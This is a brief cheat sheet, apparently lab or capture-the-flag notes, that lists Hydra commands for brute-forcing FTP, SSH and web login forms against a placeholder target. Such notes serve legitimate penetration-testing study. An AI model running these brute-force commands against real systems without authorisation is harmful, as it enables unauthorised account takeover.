- brute force password cracking
- To brute force FTP:
```shell
hydra -l user -P passlist.txt ftp://MACHINE_IP
```
- For SSH:
```shell
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```
- To bruteforce form: http-post-form or http-get-form depending on the method used by the form
```shell
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```
Ex: 
```shell
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```



